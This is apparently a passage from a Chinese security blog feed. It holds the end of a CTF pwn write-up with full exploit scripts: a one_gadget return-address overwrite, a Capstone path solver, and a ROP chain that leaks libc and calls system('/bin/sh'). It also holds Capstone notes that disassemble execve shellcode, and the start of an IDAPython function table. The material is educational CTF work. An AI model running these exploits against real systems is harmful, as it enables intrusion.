<span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取宿主机的栈地址</span></span><br><span class="line">stack_base((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">4</span>)</span><br><span class="line">rm()</span><br><span class="line">push()</span><br><span class="line">imm(<span class="number">0xe8</span>)</span><br><span class="line">sub()<span class="comment">#reg = main_stack = stack_point - 0xe8</span></span><br><span class="line">push()</span><br><span class="line"><span class="comment">#获取宿主机的libc_start_main+240地址</span></span><br><span class="line"></span><br><span class="line">rm() <span class="comment">#reg = *main_stack = libc_start_main+0x240</span></span><br><span class="line">push()</span><br><span class="line"><span class="comment">#计算偏移</span></span><br><span class="line">imm(<span class="number">0xD0917</span>) <span class="comment">#reg = offset</span></span><br><span class="line">add() <span class="comment">#add reg,stack</span></span><br><span class="line"><span class="comment">#替换libc_start_main+240也就是返回地址为onegadget</span></span><br><span class="line">wm()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">"Input your code&gt;"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="faster0"><a href="#faster0" class="headerlink" title="faster0"></a>faster0</h2><p>这道题比赛的时候没有做出来。。。那个path太恶心了。然后找了pizza大佬要了脚本来看看，发现用了Capstone（嗯，不会用，所以也顺便去学了下）。大概思路就是：先获取函数地址与对应函数索引的值（比如func000就是{0:0x4008A4}）形成map；然后通过Capstone获取其中的一个跳转的table，对其中的数值解析获取到跳转函数地址（call func001这些指令）；然后再利用call指令中的相对偏移加上call下一指令的地址获取到跳转到目标函数的地址形成路线图；再通过路线图与前面形成的map就可以得出path。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'pwn'</span>)</span><br><span class="line"></span><br><span class="line">fnlist = [] <span class="comment"># idx =&gt; addr</span></span><br><span class="line">fndict = &#123;&#125; <span class="comment"># addr =&gt; idx</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">101</span>):<span class="comment">#获取函数地址</span></span><br><span class="line">    fn = elf.sym[<span class="string">'func&#123;:0&gt;3d&#125;'</span>.format(i)]</span><br><span class="line">    fnlist.append(fn)</span><br><span class="line">    fndict[fn] = i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cs = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">cs.detail = <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dis</span><span class="params">(addr)</span>:</span><span class="comment">#获取第一条指令</span></span><br><span class="line">    buf = elf.read(addr, <span class="number">16</span>)</span><br><span class="line">    insn = next(cs.disasm(buf, addr))</span><br><span class="line">    <span class="keyword">return</span> insn</span><br><span class="line"></span><br><span class="line">fnmap = []</span><br><span class="line">fbase = <span class="number">0x4008A4</span></span><br><span class="line"><span class="keyword">for</span> idx, addr <span class="keyword">in</span> enumerate(fnlist[:<span class="number">1</span>]):</span><br><span class="line">    buf = elf.read(addr, <span class="number">256</span>)</span><br><span class="line">    pt1 = <span class="string">'89 C0 48 8D 14 85 00 00 00 00'</span>.replace(<span class="string">' '</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    p1 = buf.find(pt1) + len(pt1)<span class="comment">#p1为lea     rax, off_406034在函数中的偏移</span></span><br><span class="line"></span><br><span class="line">    i0 = dis(p1 + addr)</span><br><span class="line">    disp = i0.operands[<span class="number">1</span>].mem.disp</span><br><span class="line">    tbl = disp + p1 + addr + i0.size<span class="comment">#table地址</span></span><br><span class="line">    rels = [u32(elf.read(tbl + i * <span class="number">4</span>, <span class="number">4</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)]<span class="comment">#读取table并储存</span></span><br><span class="line">    dests = []</span><br><span class="line">    <span class="keyword">for</span> rel <span class="keyword">in</span> rels:</span><br><span class="line">        tmp = (tbl + rel) &amp; <span class="number">0xffffffff</span><span class="comment">#获得对应jmp到的地址</span></span><br><span class="line">        i1 = dis(tmp + <span class="number">5</span>)</span><br><span class="line">        call = i1.operands[<span class="number">0</span>].imm<span class="comment">#获取call目标函数的地址</span></span><br><span class="line">        didx = fndict[call]<span class="comment">#获取函数地址对应的函数idx</span></span><br><span class="line">        dests.append(didx)<span class="comment">#构造出全部路线</span></span><br><span class="line">    fnmap.append(dests[:])<span class="comment">#构造总的路线图</span></span><br><span class="line"></span><br><span class="line">cur = <span class="number">0</span></span><br><span class="line">path = []</span><br><span class="line"><span class="keyword">while</span> cur != <span class="number">100</span>:</span><br><span class="line">    t = fnmap[cur]</span><br><span class="line">    path.append(t.index(cur + <span class="number">1</span>))<span class="comment">#开始寻路</span></span><br><span class="line">    cur += <span class="number">1</span></span><br><span class="line">path = <span class="string">''</span>.join(map(str, path))<span class="comment">#将列表转为字符串</span></span><br><span class="line">info(<span class="string">'path: &#123;&#125;'</span>.format(path))</span><br></pre></td></tr></table></figure><p>然后接下来就是一个简单的栈溢出，没啥好讲的，直接上完整的exp吧：</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>首先是前面过pow的加上获得elf的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">token = ****</span><br><span class="line">p = remote(<span class="string">"39.96.72.181"</span>,<span class="string">"42732"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"x[:20] = "</span>)</span><br><span class="line">dest = p.recvline()[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(printable, repeat=<span class="number">4</span>):</span><br><span class="line">s = <span class="string">''</span>.join(i)</span><br><span class="line">x = hashlib.sha256(s).hexdigest()</span><br><span class="line">x2 = x[:<span class="number">20</span>]</span><br><span class="line"><span class="keyword">if</span> dest == x2:</span><br><span class="line">print(<span class="string">'string : '</span> + s)</span><br><span class="line">p.sendline(s)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Please input your token:"</span>)</span><br><span class="line">p.sendline(token)</span><br><span class="line">p.recvuntil(<span class="string">"Creating pwn file, please wait ...\n"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">s = p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = base64.b64decode(s)</span><br><span class="line">f = open(<span class="string">"pwn"</span>,<span class="string">'wb+'</span>)</span><br><span class="line">f.write(a)</span><br><span class="line">f.close()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>然后是elf的一个getshell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">"pwn"</span>).libc</span><br><span class="line"></span><br><span class="line">fnlist = [] <span class="comment"># idx =&gt; addr</span></span><br><span class="line">fndict = &#123;&#125; <span class="comment"># addr =&gt; idx</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">101</span>):<span class="comment">#获取函数地址</span></span><br><span class="line">    fn = elf.sym[<span class="string">'func&#123;:0&gt;3d&#125;'</span>.format(i)]</span><br><span class="line">    fnlist.append(fn)</span><br><span class="line">    fndict[fn] = i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cs = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">cs.detail = <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dis</span><span class="params">(addr)</span>:</span><span class="comment">#获取第一条指令</span></span><br><span class="line">    buf = elf.read(addr, <span class="number">16</span>)</span><br><span class="line">    insn = next(cs.disasm(buf, addr))</span><br><span class="line">    <span class="keyword">return</span> insn</span><br><span class="line"></span><br><span class="line">fnmap = []</span><br><span class="line">fbase = <span class="number">0x4008A4</span></span><br><span class="line"><span class="keyword">for</span> idx, addr <span class="keyword">in</span> enumerate(fnlist[:<span class="number">100</span>]):</span><br><span class="line">    buf = elf.read(addr, <span class="number">256</span>)</span><br><span class="line">    pt1 = <span class="string">'89 C0 48 8D 14 85 00 00 00 00'</span>.replace(<span class="string">' '</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    p1 = buf.find(pt1) + len(pt1)<span class="comment">#p1为lea     rax, off_406034在函数中的偏移</span></span><br><span class="line"></span><br><span class="line">    i0 = dis(p1 + addr)</span><br><span class="line">    disp = i0.operands[<span class="number">1</span>].mem.disp</span><br><span class="line">    tbl = disp + p1 + addr + i0.size<span class="comment">#table地址</span></span><br><span class="line">    rels = [u32(elf.read(tbl + i * <span class="number">4</span>, <span class="number">4</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)]<span class="comment">#读取table并储存</span></span><br><span class="line">    dests = []</span><br><span class="line">    <span class="keyword">for</span> rel <span class="keyword">in</span> rels:</span><br><span class="line">        tmp = (tbl + rel) &amp; <span class="number">0xffffffff</span><span class="comment">#获得对应jmp到的地址</span></span><br><span class="line">        i1 = dis(tmp + <span class="number">5</span>)</span><br><span class="line">        call = i1.operands[<span class="number">0</span>].imm<span class="comment">#获取call目标函数的地址</span></span><br><span class="line">        didx = fndict[call]<span class="comment">#获取函数地址对应的函数idx</span></span><br><span class="line">        dests.append(didx)<span class="comment">#构造出全部路线</span></span><br><span class="line">    fnmap.append(dests[:])<span class="comment">#构造总的路线图</span></span><br><span class="line"></span><br><span class="line">cur = <span class="number">0</span></span><br><span class="line">path = []</span><br><span class="line"><span class="keyword">while</span> cur != <span class="number">100</span>:</span><br><span class="line">    t = fnmap[cur]</span><br><span class="line">    path.append(t.index(cur + <span class="number">1</span>))<span class="comment">#开始寻路</span></span><br><span class="line">    cur += <span class="number">1</span></span><br><span class="line">path = <span class="string">''</span>.join(map(str, path))<span class="comment">#将列表转为字符串</span></span><br><span class="line">info(<span class="string">'path: &#123;&#125;'</span>.format(path))</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="comment">#p = remote(IP, PORT)</span></span><br><span class="line">p.sendline(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_ptr = <span class="number">0x400640</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000406013</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000406011</span></span><br><span class="line">write_got = <span class="number">0x609018</span></span><br><span class="line">bss = <span class="number">0x609500</span></span><br><span class="line">read_ptr = <span class="number">0x400680</span></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0xd0</span></span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(write_got)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(write_ptr)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_ptr)</span><br><span class="line">payload += p64(<span class="number">0x405f4a</span>)</span><br><span class="line">payload += p64(<span class="number">0x405F30</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"WOW,U R GREAT !\n"</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-libc.sym[<span class="string">'write'</span>]</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(p64(<span class="number">0</span>)+p64(pop_rdi)+p64(libc.search(<span class="string">"/bin/sh"</span>).next())+p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/a&gt;pwn&lt;/h1&gt;&lt;h2 id=&quot;boom1&quot;&gt;&lt;a href=&quot;#boom1&quot; class=&quot;headerlink&quot; title=&quot;boom1&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>capstone学习笔记</title>
    <link href="https://nuoye-blog.github.io/2020/05/19/RE/capstone%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://nuoye-blog.github.io/2020/05/19/RE/capstone%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-05-18T17:41:00.000Z</published>
    <updated>2020-05-18T17:46:41.287Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复现网鼎的题目的时候看到大佬用了Capstone，结果看不懂。。。。就顺便学习下。。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>感觉还是看官方文档更全面一点：<a href="http://www.capstone-engine.org/lang_python.html" target="_blank" rel="noopener">http://www.capstone-engine.org/lang_python.html</a></p><p>这里就搞几个小脚本来学习下怎么用。</p><h3 id="脚本1：基础反汇编"><a href="#脚本1：基础反汇编" class="headerlink" title="脚本1：基础反汇编"></a>脚本1：基础反汇编</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">cs = Cs(CS_ARCH_X86, CS_MODE_64)<span class="comment">#设置cpu体系为64位的x86</span></span><br><span class="line">cs.detail = <span class="literal">True</span></span><br><span class="line">code = <span class="string">'\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'</span></span><br><span class="line">discode = cs.disasm(code, <span class="number">0x400800</span>)<span class="comment">#反汇编代码，其实地址为0x400800</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> discode:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"0x%x:\t%s\t%s"</span> % (i.address,i.mnemonic,i.op_str)</span><br></pre></td></tr></table></figure><p>直接运行，就可以得到类似ida中看到的内容：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python example1.py</span><br><span class="line">0x400800:       jmp     0x40080d</span><br><span class="line">0x400802:       pop     rbx</span><br><span class="line">0x400803:       xor     eax, eax</span><br><span class="line">0x400805:       xor     ecx, ecx</span><br><span class="line">0x400807:       xor     edx, edx</span><br><span class="line">0x400809:       mov     al, 0xb</span><br><span class="line">0x40080b:       int     0x80</span><br><span class="line">0x40080d:       call    0x400802</span><br></pre></td></tr></table></figure><p>上面for循环遍历出来的i有如下几个成员：</p><table><thead><tr><th>成员名</th><th>描述</th></tr></thead><tbody><tr><td>id</td><td>汇编指令的id</td></tr><tr><td>address</td><td>代码地址</td></tr><tr><td>mnemonic</td><td>汇编指令</td></tr><tr><td>op_str</td><td>操作对象字符串</td></tr><tr><td>size</td><td>汇编指令的大小</td></tr><tr><td>bytes</td><td>返回对应汇编指令的机器码</td></tr><tr><td>operands</td><td>操作对象（后面介绍）</td></tr></tbody></table><h3 id="脚本2：operands尝试"><a href="#脚本2：operands尝试" class="headerlink" title="脚本2：operands尝试"></a>脚本2：operands尝试</h3><p>operands也包含了很多成员，下面跟着官方文档来尝试操作下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone.x86 <span class="keyword">import</span> *</span><br><span class="line">cs = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">cs.detail = <span class="literal">True</span></span><br><span class="line">code = <span class="string">'\x8B\x87\x76\x98\x00\x00\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'</span></span><br><span class="line"><span class="keyword">for</span> insn <span class="keyword">in</span> cs.disasm(code, <span class="number">0x1000</span>):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"0x%x:\t%s\t%s"</span> % (insn.address,insn.mnemonic,insn.op_str)</span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> insn.operands:</span><br><span class="line">c+=<span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\toperands[%d]:"</span>%c</span><br><span class="line"><span class="keyword">if</span> i.type == X86_OP_REG:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\t\tREG=%s"</span>%(insn.reg_name(i.value.reg))<span class="comment">#获取寄存器的名称</span></span><br><span class="line"><span class="keyword">if</span> i.type == X86_OP_IMM:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t\tIMM=0x%x"</span>%(i.value.imm)<span class="comment">#获取立即数</span></span><br><span class="line"><span class="keyword">if</span> i.type == X86_OP_MEM:<span class="comment">#如[rax+0x10]或[rax+rbx]</span></span><br><span class="line"><span class="keyword">if</span> i.mem.base != <span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t\tREG=%s"</span>%(insn.reg_name(i.mem.base))<span class="comment">#获取寄存器名称，即rax</span></span><br><span class="line"><span class="keyword">if</span> i.mem.index != <span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t\tIMM=0x%x"</span>%(i.mem.index)<span class="comment">#获取第二个寄存器名称，即rbx</span></span><br><span class="line"><span class="keyword">if</span> i.mem.disp != <span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t\tIMM=0x%x"</span>%(i.mem.disp)<span class="comment">#获取偏移量，即0x10</span></span><br></pre></td></tr></table></figure><p>对应的输出：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$ python example2.py</span><br><span class="line">0x1000: mov     eax, dword ptr [rdi + 0x9876]</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=eax</span><br><span class="line">        operands[2]:</span><br><span class="line">                REG=rdi</span><br><span class="line">                IMM=0x9876</span><br><span class="line">0x1006: jmp     0x1013</span><br><span class="line">        operands[1]:</span><br><span class="line">                IMM=0x1013</span><br><span class="line">0x1008: pop     rbx</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=rbx</span><br><span class="line">0x1009: xor     eax, eax</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=eax</span><br><span class="line">        operands[2]:</span><br><span class="line">                REG=eax</span><br><span class="line">0x100b: xor     ecx, ecx</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=ecx</span><br><span class="line">        operands[2]:</span><br><span class="line">                REG=ecx</span><br><span class="line">0x100d: xor     edx, edx</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=edx</span><br><span class="line">        operands[2]:</span><br><span class="line">                REG=edx</span><br><span class="line">0x100f: mov     al, 0xb</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=al</span><br><span class="line">        operands[2]:</span><br><span class="line">                IMM=0xb</span><br><span class="line">0x1011: int     0x80</span><br><span class="line">        operands[1]:</span><br><span class="line">                IMM=0x80</span><br><span class="line">0x1013: call    0x1008</span><br><span class="line">        operands[1]:</span><br><span class="line">                IMM=0x1008</span><br></pre></td></tr></table></figure><p>呃。。。大概就先这样吧，后面有遇到需要再补充</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;复现网鼎的题目的时候看到大佬用了Capstone，结果看不懂。。。。就顺便学习下。。&lt;/p&gt;
&lt;h1 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正
      
    
    </summary>
    
    
      <category term="RE" scheme="https://nuoye-blog.github.io/categories/RE/"/>
    
    
      <category term="RE" scheme="https://nuoye-blog.github.io/tags/RE/"/>
    
      <category term="tool" scheme="https://nuoye-blog.github.io/tags/tool/"/>
    
      <category term="python" scheme="https://nuoye-blog.github.io/tags/python/"/>
    
      <category term="ida" scheme="https://nuoye-blog.github.io/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>跟着Lantern学逆向之IDA python</title>
    <link href="https://nuoye-blog.github.io/2020/05/18/RE/%E8%B7%9F%E7%9D%80Lantern%E5%AD%A6RE%E4%B9%8BIDA%20python/"/>
    <id>https://nuoye-blog.github.io/2020/05/18/RE/%E8%B7%9F%E7%9D%80Lantern%E5%AD%A6RE%E4%B9%8BIDA%20python/</id>
    <published>2020-05-18T08:42:00.000Z</published>
    <updated>2020-05-18T08:41:45.682Z</updated>
    
    <content type="html"><![CDATA[<p>跟着<a href="https://lantern.cool/2020/05/05/ida-python/" target="_blank" rel="noopener">Lantern</a>学逆向之IDA python:</p><h1 id="函数表"><a href="#函数表" class="headerlink" title="函数表"></a>函数表</h1><p>首先是介绍一些函数：</p><table><thead><tr><th>函数名</th><th>作用</th></tr></thead><tbody><tr><td>ScreenEA()</td><td>获取 IDA 调试窗口中，光标指向代码的地址。</td></tr><tr><td>GetInputFileMD5()</td><td>返回 IDA 加载的二进制文件的 MD5 值。</td></tr><tr><td>FirstSeg()</td><td>访问程序中的第一个段。</td></tr><tr><td>NextSeg()</td><td>访问下一个段，如果没有就返回 BADADDR。</td></tr><tr><td>SegByName( string SegmentName )</td><td>通过段名字返回段基址，举个例子，如果调用.text 作为参数，就会返回程序中代码段的开始位置。</td></tr><tr><td>SegEnd( long Address )</td><td>通过段内的某个地址，获得段尾的地址。</td></tr><tr><td>SegStart( long Address )</td><td>通过段内的某个地址，获得段头的地址。</td></tr><tr><td>SegName( long Address )</td><td>通过段内的某个地址，获得段名。</td></tr><tr><td>Segments()</td><td>返回目标程序中的所有段的开始地址。</td></tr><tr><td>Functions( long StartAddress, long EndAddress )</td><td>返回一个列表，包含了从 StartAddress 到 EndAddress 之间的所有函数。</td></tr><tr><td>Chunks( long FunctionAddress )</td><td>返回一个列表，包含了函数片段。每个列表项都是一个元组（chunk start, chunk end）</td></tr><tr><td>LocByName( string FunctionName )</td><td>通过函数名返回函数的地址。</td></tr><tr><td>GetFuncOffset( long Address )</td><td>通过任意一个地址，然后得到这个地址所属的函数名，以及给定地址和函数的相对位移。 然后把这些信息组成字符串以”名字+位移”的形式返回。</td></tr><tr><td>GetFunctionName( long Address )</td><td>通过一个地址，返回这个地址所属的函数。</td></tr><tr><td>CodeRefsTo( long Address, bool Flow )</td><td>返回一个列表，告诉我们 Address 处代码被什么地方引用了，Flow 告诉 IDAPython 是否要 跟踪这些代码。</td></tr><tr><td>CodeRefsFrom( long Address, bool Flow )</td><td>返回一个列表，告诉我们 Address 